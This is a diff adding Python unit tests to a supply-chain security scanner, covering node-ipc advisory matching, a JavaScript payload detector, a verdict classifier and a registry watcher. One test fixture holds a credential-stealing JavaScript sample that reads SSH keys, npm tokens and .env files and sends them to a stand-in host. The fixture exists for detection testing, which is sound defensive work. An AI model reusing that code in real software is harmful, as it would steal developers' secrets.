@@ -3,6 +3,7 @@ import json
 import sys
 import tempfile
 import unittest
+from datetime import datetime, timezone
 from io import StringIO
 from pathlib import Path
 from unittest import mock
@@ -14,6 +15,10 @@ if str(REPO_ROOT) not in sys.path:
 
 from secopsai import supply_chain
 from secopsai import cli as secopsai_cli
+
+
+def datetime_from_epoch(epoch: float) -> str:
+    return datetime.fromtimestamp(epoch, tz=timezone.utc).isoformat().replace("+00:00", "Z")
 
 
 class SupplyChainTests(unittest.TestCase):
@@ -708,6 +713,103 @@ name = "normalpkg"
         self.assertEqual(payload["verdict"], "malicious")
         self.assertEqual(payload["advisory_matches"][0]["advisory_id"], "ADV-EXPLAIN")
         self.assertIn("emergency advisory match", [rule["rule"] for rule in payload["matched_rules"]])
+
+    def test_node_ipc_seed_advisory_matches_affected_versions_only(self):
+        for version in ("9.1.6", "9.2.3", "12.0.1"):
+            payload = supply_chain.check_advisory("npm", "node-ipc", version)
+            self.assertTrue(payload["matched"], version)
+            self.assertEqual(payload["matches"][0]["campaign_id"], "node-ipc-stealer-backdoor-2026")
+
+        clean = supply_chain.check_advisory("npm", "node-ipc", "12.0.0")
+        self.assertFalse(clean["matched"])
+
+    def test_javascript_semantic_findings_detect_node_ipc_style_payload(self):
+        source = """
+const os = require("os");
+const fs = require("fs");
+const https = require("https");
+(() => {
+  const host = os.hostname();
+  const home = os.homedir();
+  const env = process.env.GITHUB_TOKEN || process.env.NPM_TOKEN;
+  const files = [home + "/.ssh/id_rsa", home + "/.npmrc", home + "/.env"].map((p) => fs.readFileSync(p, "utf8"));
+  const body = Buffer.from(JSON.stringify({ host, env, files })).toString("base64");
+  https.request("https://example.invalid/collect").end(body);
+})();
+"""
+        findings = supply_chain._javascript_semantic_findings("node-ipc.cjs", source)
+        joined = "\n".join(findings)
+        self.assertIn("module-load execution", joined)
+        self.assertIn("host fingerprinting", joined)
+        self.assertIn("local file enumeration", joined)
+        self.assertIn("credential harvesting", joined)
+        self.assertIn("exfiltration staging", joined)
+        self.assertIn("node-ipc CommonJS bundle", joined)
+
+    def test_classifier_flags_node_ipc_style_semantic_findings(self):
+        report = """
+## Semantic Findings
+
+- node-ipc.cjs: javascript module-load execution via IIFE/self-executing payload
+- node-ipc.cjs: javascript host fingerprinting via os APIs
+- node-ipc.cjs: javascript local file enumeration of developer or credential paths
+- node-ipc.cjs: javascript environment credential harvesting via process.env
+- node-ipc.cjs: javascript payload wrapping or exfiltration staging
+- node-ipc.cjs: node-ipc CommonJS bundle contains high-risk appended payload indicators
+"""
+        payload = supply_chain.explain_verdict(report, ecosystem="npm", package="node-ipc", version="12.0.2")
+        self.assertEqual(payload["verdict"], "malicious")
+        rules = {rule["rule"] for rule in payload["matched_rules"]}
+        self.assertIn("semantic module-load execution", rules)
+        self.assertIn("semantic credential harvesting", rules)
+        self.assertIn("node-ipc bundle payload indicators", rules)
+
+    def test_watch_registry_dry_run_scans_mocked_recent_npm_version_without_persisting(self):
+        now = 1_800_000_000.0
+        metadata = {
+            "time": {
+                "created": "2026-05-01T00:00:00.000Z",
+                "9.2.2": "2026-05-01T00:00:00.000Z",
+                "9.2.3": datetime_from_epoch(now - 60),
+                "modified": datetime_from_epoch(now - 30),
+            }
+        }
+        fake_result = supply_chain.ScanResult(
+            ecosystem="npm",
+            package="node-ipc",
+            old_version="9.2.2",
+            new_version="9.2.3",
+            verdict="malicious",
+            analysis="advisory matched",
+            report_path=None,
+            rank=None,
+            finding_id="SCM-NODEIPC",
+        )
+        with mock.patch.object(supply_chain, "_scan_release", return_value=fake_result) as scan_mock, \
+             mock.patch.object(supply_chain, "_append_results") as append_mock, \
+             mock.patch.object(supply_chain, "_upsert_findings") as upsert_mock:
+            payload = supply_chain.watch_registry(
+                ecosystem="npm",
+                package="node-ipc",
+                since="10m",
+                dry_run=True,
+                persist=False,
+                metadata=metadata,
+                now=now,
+            )
+
+        self.assertEqual(payload["total_scanned"], 1)
+        self.assertEqual(payload["malicious"], 1)
+        scan_mock.assert_called_once()
+        self.assertEqual(scan_mock.call_args.kwargs["old_version"], "9.2.2")
+        append_mock.assert_not_called()
+        upsert_mock.assert_not_called()
+
+    def test_node_ipc_mitigation_keeps_package_verdict_independent_of_local_usage(self):
+        payload = supply_chain.explain_verdict("", ecosystem="npm", package="node-ipc", version="12.0.1")
+        self.assertEqual(payload["verdict"], "malicious")
+        self.assertEqual(payload["environment_impact"]["status"], "unknown")
+        self.assertTrue(any("Block affected versions" in step for step in payload["mitigation"]))
 
     def test_reconcile_history_upgrades_advisory_error(self):
         with tempfile.TemporaryDirectory() as temp_dir:
